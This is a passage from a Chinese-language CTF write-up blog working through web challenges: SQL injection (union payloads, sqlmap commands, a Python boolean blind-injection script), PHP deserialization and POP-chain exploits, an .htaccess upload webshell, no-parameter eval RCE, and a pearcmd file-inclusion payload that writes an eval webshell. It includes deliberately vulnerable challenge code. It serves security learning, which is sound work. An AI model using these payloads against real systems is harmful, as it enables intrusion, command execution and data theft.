whEre tAble_nAme&#x3D;’here_is_flag’))%23</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9345d1a.png" alt="image-20240127014125897"></p><p>经典</p><p>?id&#x3D;1’ uNion Select ((sElect grOup_cOncat(column_name) From infOrmation_schema.columns Where Table_name&#x3D;’here_is_flag’)),2,3,4,5%23</p><p>不想管了 </p><p><img src="https://bu.dusays.com/2024/05/13/6641fa944541f.png" alt="image-20240127014522482"></p><p>查值：</p><p>id&#x3D;1’uNion Select 1,2,3,4,(sElect grOup_cOncat(flag) From ‘ here_is_flag’)%23</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa946f563.png" alt="image-20240127014941787"></p><p>sqlmap也可以 但是我没做起 报了个什么错 没搞懂</p><p>payload: 别人的结果</p><p>sqlmap -u ‘<a href="http://http//9dfeb06c-8482-4b4b-b5a9-ed3625a7e087.node5.buuoj.cn:81/%EF%BC%9Fid=1">http://http://9dfeb06c-8482-4b4b-b5a9-ed3625a7e087.node5.buuoj.cn:81/？id=1</a>‘ -D ‘ctf’ -T ‘here_is_flag’ -C ‘flag’  –dump   </p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9a5e0e4.png" alt="image-20240127152916422"></p><p>sqlmap简单使用：</p><p>1、检测「注入点」</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘<br>1<br>2、查看所有「数据库」</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ –dbs<br>1<br>3、查看当前使用的数据库</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ –current-db<br>1<br>4、查看「数据表」</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ –tables<br>1<br>5、查看「字段」</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ -T ‘users’ –tables<br>1<br>6、查看「数据」</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ -T ‘users’ –dump</p><p><img src="https://img-blog.csdnimg.cn/6d8451a8d3bb4340b96fb40218ee7138.png" alt="img"></p><p>post、UA等上的注入方法：</p><ul><li><p>找到注入点后 bp抓包 在注入点后加* 把整个包复制下来 保存</p></li><li><p>用-r来打开保存后的包</p></li></ul><h4 id="Unserialize？"><a href="#Unserialize？" class="headerlink" title="Unserialize？"></a>Unserialize？</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// Maybe you need learn some knowledge about deserialize?</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">            @<span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>很多反序列化的知识已经忘了  过年的时候把笔记补上</p><p>__destruct()这是在对象被销毁时自动调用</p><ol><li>对象生命周期结束：当一个对象的生命周期结束时，例如脚本执行结束或对象不再被引用时，PHP 的垃圾回收机制会自动销毁该对象，并触发 <code>__destruct()</code> 方法。</li><li>对象被显式销毁：可以使用 <code>unset()</code> 函数显式销毁一个对象，这将触发 <code>__destruct()</code></li></ol><p>复现如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>=(<span class="string">&#x27;ls -al&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">    <span class="comment">//O:4:&quot;evil&quot;:1:&#123;s:9:&quot;evilcmd&quot;;s:6:&quot;ls -al&quot;;&#125; </span></span><br></pre></td></tr></table></figure><p>但是PHP 序列化的时候 private和 protected 变量会引入不可见字符%00，private是%00类名%00属性名 ，protected为%00*%00属性名</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa930f256.png" alt="image-20240127161447216"></p><p>两个白空格就是</p><p>url编码后O%3A4%3A%22evil%22%3A1%3A%7Bs%3A9%3A%22***%00<em><strong>evil</strong></em>%00***cmd%22%3Bs%3A6%3A%22ls+-al%22%3B%7D </p><p>因为是private，序列化出来后会有%00属性导致无法完全复制去burp，而且传参里也不能有空格，应该用%20或者‘+’链接因为最后使用post传参可以识别url编码，所以把空格处替换为%20</p><p> O:4:”evil”:1:{s:9:”%00evil%00cmd”;s:6:”ls%20-al”;} </p><p>直接查根目录  linux中查询根目录下文件的命令为ls &#x2F;    在上面的代码中将ls -al 改为ls &#x2F;</p><p>O:4:”evil”:1:{s:9:”%00evil%00cmd”;s:4:”ls%20&#x2F;“;} </p><p><img src="https://bu.dusays.com/2024/05/13/6641fa940f5c6.png" alt="image-20240127162542891"></p><p>发现flag文件 </p><p>禁用了cat|tac|more|tail|base </p><p>还可以用 head  nl  uniq</p><p>uniq &#x2F;th1s_1s_fffflllll4444aaaggggg</p><p>nl &#x2F;th1s_1s_fffflllll4444aaaggggg</p><p>head &#x2F;th1s_1s_fffflllll4444aaaggggg</p><p>直接序列化</p><p>O:4:”evil”:1:{s:9:”%00evil%00cmd”;s:35:”head%20&#x2F;th1s_1s_fffflllll4444aaaggggg”;} </p><p>O:4:”evil”:1:{s:9:”%00evil%00cmd”;s:33:”nl%20&#x2F;th1s_1s_fffflllll4444aaaggggg”;} </p><p>O:4:”evil”:1:{s:9:”%00evil%00cmd”;s:35:”uniq%20&#x2F;th1s_1s_fffflllll4444aaaggggg”;} </p><p>也可以再url编码      echo urlencode(serialize($a));  这样就可以不加%00</p><p>O%3A4%3A%22evil%22%3A1%3A%7Bs%3A9%3A%22%00evil%00cmd%22%3Bs%3A35%3A%22head+%2Fth1s_1s_fffflllll4444aaaggggg%22%3B%7D </p><p>但是直接这样也不行  要把命令中的加号替换为%20或者空格</p><p>即：</p><p>O%3A4%3A%22evil%22%3A1%3A%7Bs%3A9%3A%22%00evil%00cmd%22%3Bs%3A35%3A%22head***%20***%2Fth1s_1s_fffflllll4444aaaggggg%22%3B%7D </p><p><img src="https://bu.dusays.com/2024/05/13/6641fa942a707.png" alt="image-20240127164959219"></p><p>其他的同理即可</p><h4 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h4><p><img src="https://bu.dusays.com/2024/05/13/6641fa98df36e.png" alt="image-20240127165514001"></p><p>真挺讨厌文件上传的</p><p>.htaccess</p><p>.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p><p>总之就是告诉服务器将 <code>.jpg</code> 后缀的文件解析为 PHP 脚本</p><p>AddType application&#x2F;x-httpd-php .jpg</p><p>将jpg用php解析</p><p>常见配置：</p><p>AddHandler php5-script .jpg</p><p>AddType application&#x2F;x-httpd-php .jpg</p><p>Sethandler application&#x2F;x-httpd-php<br>Sethandler 将该目录及子目录的所有文件均映射为php文件类型。<br>Addhandler 使用 php5-script 处理器来解析所匹配到的文件。<br>AddType 将特定扩展名文件映射为php文件类型。</p><p>先传配置文件   .htaccess  可以</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9a09e91.png" alt="image-20240127184547569"></p><p>再传图片马</p><p>?我传个没马的也给我过滤了？懵了 换了张图片也是这样 give up</p><p>这个应该是传了.htaccess后 再传图片马 然后蚁剑连接 根目录上找flag</p><p>找了wp就是这样</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9442d79.png" alt="image-20240127192240775"></p><p><img src="https://bu.dusays.com/2024/05/13/6641fa945cc67.png" alt="image-20240127192303247"></p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9458dfe.png" alt="image-20240127192313715"></p><p>本来文件上传和蚁剑就是我的弱项 你还给我整这出  </p><p>它过滤了&lt;?  只要有&lt;?就会被认为是php  所以要用javascript写来绕过&lt;?</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9ac5a14.png" alt="image-20240127233054341"></p><p>ok 这个上传上去了  不是用的图片马 而是直接改的后缀</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9465904.png" alt="image-20240127233320601"></p><p>好好好 终于进来了</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa974e4b0.png" alt="image-20240127233356332"></p><p><img src="https://bu.dusays.com/2024/05/13/6641fa936b032.png" alt="image-20240127233411157"></p><p>GGGGGGet</p><h4 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h4><p><img src="https://bu.dusays.com/2024/05/13/6641fa940d821.png" alt="image-20240127192543606"></p><p>上来就是一个下马威 应该要整点信息泄露</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa93ca0ab.png" alt="image-20240127194316310"></p><p>git泄露 被禁了</p><p>githack下来</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa943ecfd.png" alt="image-20240127195156971"></p><p>bo0g1pop.php中有</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>严格等于分号  懵了</p><p>确实是没见过</p><p>if (‘;’ &#x3D;&#x3D;&#x3D; preg_replace(‘&#x2F;[^\W]+((?R)?)&#x2F;‘, ‘’, $_GET[‘star’]))这是一个非常典型的无参数rce题</p><p>这里的正则表达式 [^\W]+((?R)?) 匹配了一个或多个非标点符号字符（表示函数名），后跟一个括号（表示函数调用）。其中 (?R) 是递归引用，<strong>它只能匹配和替换嵌套的函数调用，而不能处理函数参数</strong>。使用该正则表达式进行替换后，每个函数调用都会被删除，只剩下一个分号 ;，而最终结果强等于；时，payload才能进行下一步。简而言之，<strong>无参数rce就是不使用参数，而只使用一个个函数最终达到目的</strong>。</p><p>无参数rce可能用到的函数:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">目录操作：</span><br><span class="line">getchwd() ：函数返回当前工作目录。</span><br><span class="line">scandir() ：函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() ：函数返回路径中的目录部分。</span><br><span class="line">chdir() ：函数改变当前的目录。</span><br><span class="line"></span><br><span class="line">数组相关的操作：</span><br><span class="line">end() - 将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">next() - 将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">prev() - 将内部指针指向数组中的上一个元素，并输出。</span><br><span class="line">reset() - 将内部指针指向数组中的第一个元素，并输出。</span><br><span class="line">each() - 返回当前元素的键名和键值，并将内部指针向前移动。</span><br><span class="line">array_shift() - 删除数组中第一个元素，并返回被删除元素的值。</span><br><span class="line">array_reverse() -逆转数组</span><br><span class="line">array_flip()：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 NULL。</span><br><span class="line">array_rand()：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，                         array_rand() 返回随机单元的键名。 否则就返回包含随机键名的数组。 完               成后，就可以根据随机的键获取数组的随机值。</span><br><span class="line"> array_flip()和array_rand()配合使用可随机返回当前目录下的文件名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">读文件</span><br><span class="line">show_source() - 对文件进行语法高亮显示。</span><br><span class="line">readfile() - 输出一个文件。</span><br><span class="line">highlight_file() - 对文件进行语法高亮显示。</span><br><span class="line">file_get_contents() - 把整个文件读入一个字符串中。</span><br><span class="line">readgzfile() - 可用于读取非 gzip 格式的文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">关键函数：</span><br><span class="line">getenv() ：获取环境变量的值  </span><br><span class="line">           php7.0以下返回bool(false)</span><br><span class="line">           php7.0以上正常回显</span><br><span class="line">           payload:</span><br><span class="line">           ?code=var_dump(getenv());</span><br><span class="line">           ?code=var_dump(getenv(phpinfo()));</span><br><span class="line">           </span><br><span class="line">           </span><br><span class="line">           </span><br><span class="line">getallheaders()：获取所有 HTTP 请求标头，是apache_request_headers()的别名函                    数，但是该函数只能在Apache环境下使用</span><br><span class="line"></span><br><span class="line">                  payload:</span><br><span class="line">                  1) GET /1.php?code=eval(end(getallheaders()));                              HTTP/1.1</span><br><span class="line">                     .....</span><br><span class="line">                     flag: system(&#x27;id&#x27;);</span><br><span class="line">                  2) GET /1.php?exp=eval(end(apache_request_headers()));                      HTTP/1.1</span><br><span class="line">                     ....</span><br><span class="line">                     flag: system(&#x27;id&#x27;);      php7以上</span><br><span class="line">                    </span><br><span class="line">                     </span><br><span class="line">                     </span><br><span class="line">get_defined_vars()：返回由所有已定义变量所组成的数组，会返回$_GET</span><br><span class="line">                   ,$_POST,$_COOKIE,$_FILES全局变量的值，返回数组顺序为get-                       &gt;post-&gt;cookie-&gt;files</span><br><span class="line">           current()：返回数组中的当前单元，初始指向插入到数组中的第一个单元，也                        就是会返回$_GET变量的数组值</span><br><span class="line">          payload:</span><br><span class="line">          1） code=eval(end(current(get_defined_vars())));</span><br><span class="line">              &amp;flag=system(&#x27;ls&#x27;);    利用全局变量进RCE</span><br><span class="line">          2）flag=system(&#x27;id&#x27;);&amp;code=eval(pos(pos(get_defined_vars())));</span><br><span class="line">           </span><br><span class="line">           pos() 函数返回数组中的当前元素的值。</span><br><span class="line"></span><br><span class="line">           该函数是 current() 函数的别名。</span><br><span class="line">                  </span><br><span class="line">                  </span><br><span class="line">                 </span><br><span class="line">session_start()：启动新会话或者重用现有会话，成功开始会话返回 TRUE ，反之返回                      FALSE,返回参数给session_id()</span><br><span class="line">session_id()：获取/设置当前会话 ID，返回当前会话ID。 如果当前没有会话，则返回空字符               串（””）</span><br><span class="line">scandir()  文件读取</span><br></pre></td></tr></table></figure><p>太复杂了 没咋看懂 遇到题再来练吧</p><p>法1：</p><p>用array_flip()和array_rand()</p><p>?star&#x3D;eval(array_rand(array_flip(getallheaders())));</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9509e75.png" alt="image-20240128020145114"></p><p>cat flag</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa94330c5.png" alt="image-20240128020515102"></p><p>法2：</p><p>用array_reverse()和pos</p><p>?star&#x3D;eval(pos(array_reverse(getallheaders())));</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9749981.png" alt="image-20240128020756998"></p><p>还必须要用X-Forwarder-Proto: ？</p><p>cat flag</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa961756e.png" alt="image-20240128021016609"></p><p>直接cat &#x2F;f*也可以</p><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="Include-🍐"><a href="#Include-🍐" class="headerlink" title="Include 🍐"></a>Include 🍐</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        <span class="comment"># Something in phpinfo.php!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>还有file协议可以用</p><p>?file&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;phpinfo</p><p>?file&#x3D;phpinfo</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa93d4c91.png" alt="image-20240131144457596"></p><p>这是啥啊</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa93a2d42.png" alt="image-20240131150259656"></p><p>所以呢 虽然我感觉在哪里见过这个register_argc_argv </p><p>结合题目 应该要用pear文件</p><p>直接构造payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[0]);?&gt;+/tmp/cmd.php</span><br></pre></td></tr></table></figure><p>把<code>&lt;?=@eval($_POST[0]);?&gt;</code>写入了cmd.php</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa958ad2e.png" alt="image-20240131190513057"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/tmp/cmd</span><br><span class="line">post:0=system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure><p>懵了</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa983b217.png" alt="image-20240131235659299"></p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9970580.png" alt="image-20240131235857961"></p><p>试下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[0]);?&gt;+/tmp/cmd.php</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641fa96939b9.png" alt="image-20240201000302645"></p><p>终于好了</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9b42c00.png" alt="image-20240201000441411"></p><p><img src="https://bu.dusays.com/2024/05/13/6641fa99da1a5.png" alt="image-20240201000501123"></p><p>flag{866ff3b3-4cd3-459a-ae7b-a008460ccb6b}</p><p>你猜是为什么会这样 明明我传到没问题 但是没实现命令 </p><p>直接url中get传参会把&lt;这些字符自动编码，就成功不了，所以用burp抓包再改回来，这个特别重要 我就是这里改少了 导致后边做不了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">它会把?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[0]);?&gt;+/tmp/cmd.php</span><br><span class="line"></span><br><span class="line">改为?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/%3C?=@eval($_POST[0]);?%3E+/tmp/cmd.php</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>要改回来 然后就行了</p><h3 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h3><p><img src="https://bu.dusays.com/2024/05/13/6641fa9616954.png" alt="image-20240201170649597"></p><p>和上次那个很像</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa95006f1.png" alt="image-20240201170738191"></p><p>还是id</p><p>sqlmap跑不出来显示无参数可注入</p><p>sql盲注脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://1e69aee3-11f1-4a55-b4a2-8545b1633f65.node5.buuoj.cn:81//?id=TMP0919&#x27;AND &quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&#x27;Ascii(Substr((Select flag from here_is_flag),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>--+&#x27;</span></span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;points&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    time.sleep(<span class="number">1</span>)  <span class="comment"># 暂停1秒，降低爬取速度</span></span><br><span class="line">    </span><br><span class="line">    首先，导入了requests库，该库用于发送HTTP请求并获取响应。</span><br><span class="line">然后，定义了一个URL变量，用于存储要爬取的网页地址。</span><br><span class="line">接下来，初始化了一个空字符串result和一个计数器i。</span><br><span class="line">进入一个无限循环，在每次迭代中：</span><br><span class="line"></span><br><span class="line">计数器i递增<span class="number">1</span>，表示尝试获取下一个字符。</span><br><span class="line">设置一个范围head和tail，分别代表可能的ASCII码值的范围（这里设置为<span class="number">32</span>到<span class="number">126</span>）。</span><br><span class="line">使用二分查找算法在范围内找到中间值mid。</span><br><span class="line">构造一个payload字符串，其中包含当前计数器的值和中间ASCII码值。</span><br><span class="line">发送GET请求到目标URL，并将payload附加到URL后。将响应保存在变量r中。</span><br><span class="line">检查响应文本中是否包含<span class="string">&quot;points&quot;</span>关键字，如果存在，则将搜索范围缩小为[mid+<span class="number">1</span>, tail]；否则，将搜索范围缩小为[head, mid]。</span><br><span class="line">如果找到了目标字符（即head不等于<span class="number">32</span>），将其添加到结果字符串result中。</span><br><span class="line">如果未找到目标字符，跳出无限循环。</span><br><span class="line">打印结果字符串。</span><br><span class="line">为了降低爬取速度，添加了暂停<span class="number">1</span>秒的语句（time.sleep(<span class="number">1</span>)）</span><br></pre></td></tr></table></figure><p>在week2的基础上，多过滤了union。</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9407216.png" alt="image-20240201180835613"></p><p>是布尔盲注</p><p>两个脚本都可以</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa97b6605.png" alt="image-20240201180200670"></p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9579cb8.png" alt="image-20240201180658354"></p><p>flag{4549e50b-b8fe-423a-9d5c-9fcda9f82115}</p><h3 id="POP-Gadget"><a href="#POP-Gadget" class="headerlink" title="POP Gadget"></a>POP Gadget</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$vars</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">getStr</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;==GAME OVER==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;handle-&gt;log);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]); </span><br></pre></td></tr></table></figure><p>Begin::__destruct -&gt; Then::__toString -&gt; Super::__invoke -&gt; Handle::__call -&gt; CTF::end -&gt; WhiteGod::__unset</p><p>pop链：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> </span><br><span class="line">class Begin&#123;</span><br><span class="line">    public $name;</span><br><span class="line"> </span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Then&#123;</span><br><span class="line">    private $func;</span><br><span class="line"></span><br><span class="line">public 